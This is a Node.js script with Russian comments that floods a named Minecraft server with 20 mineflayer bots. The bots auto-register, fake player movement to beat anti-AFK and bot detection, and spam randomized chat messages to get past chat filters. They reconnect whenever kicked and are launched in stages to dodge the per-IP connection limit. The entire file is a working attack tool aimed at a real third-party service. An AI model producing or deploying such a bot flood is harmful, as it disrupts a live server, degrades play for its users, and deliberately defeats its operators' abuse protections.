const mineflayer = require('mineflayer');

// Конфигурация цели
const TARGET_IP = 'mc.mineblaze.ru';
const PASS = 'iamsuck12345';
const MAX_BOTS = 20; // Количество одновременно запущенных ботов

function createKillerBot(id) {
    // Генерация ника: HackerLil + случайные цифры
    const username = `HackerLil_${Math.floor(Math.random() * 99999)}`;
    
    const bot = mineflayer.createBot({
        host: TARGET_IP,
        username: username,
        version: false // Автоматическое определение версии сервера
    });

    // 1. Обход защиты при входе (Регистрация)
    bot.once('spawn', () => {
        console.log(`[+] Бот ${username} зашел на сервер.`);
        
        setTimeout(() => {
            bot.chat(`/reg ${PASS} ${PASS}`);
            console.log(`[!] Бот ${username} прошел регистрацию.`);

            // Добавляем команду /s4 через секунду после логина
            setTimeout(() => {
                bot.chat('/s4');
                console.log(`[!] Бот ${username} отправил команду /s4`);
            }, 1000);

            console.log(`[!] Бот ${username} прошел авторизацию.`);
            // Запуск циклов обхода после логина
            startAntiAfk(bot);
            startSpam(bot);
        }, 3000);
    });

    // 2. Обход Anti-AFK (Эмуляция живого игрока)
    function startAntiAfk(bot) {
        setInterval(() => {
            const actions = ['forward', 'back', 'left', 'right', 'jump'];
            const move = actions[Math.floor(Math.random() * actions.length)];
            
            bot.setControlState(move, true);
            setTimeout(() => bot.setControlState(move, false), 1000);
            
            // Случайный прыжок для обхода проверки на ботов
            if (Math.random() > 0.5) {
                bot.setControlState('jump', true);
                setTimeout(() => bot.setControlState('jump', false), 500);
            }
        }, 5000);
    }

    // 3. Обход чат-фильтров (Уникальный текст)
    function startSpam(bot) {
        setInterval(() => {
            const randomID = Math.random().toString(36).substring(7);
            const messages = [
                `Gothbreach Helper здесь! [ID: ${randomID}]`,
                `Server status: LAG [${randomID}]`,
                `Hacking in progress... [${randomID}]`
            ];
            bot.chat(messages[Math.floor(Math.random() * messages.length)]);
        }, 12000); // Интервал 12 секунд, чтобы не забанили моментально
    }

    // 4. Авто-реконнект при кике или ошибке
    bot.on('kicked', (reason) => {
        console.log(`[-] Бот ${username} кикнут. Причина: ${reason}. Перезапуск через 10 сек...`);
        setTimeout(() => createKillerBot(id), 10000);
    });

    bot.on('error', (err) => {
        console.log(`[!] Ошибка бота ${username}: ${err.message}`);
        setTimeout(() => createKillerBot(id), 5000);
    });
}

// Постепенный запуск ботов ("лесенка"), чтобы не сработал лимит подключений с IP
for (let i = 0; i < MAX_BOTS; i++) {
    setTimeout(() => {
        createKillerBot(i);
    }, i * 4000); // Запуск нового бота каждые 4 секунды
}
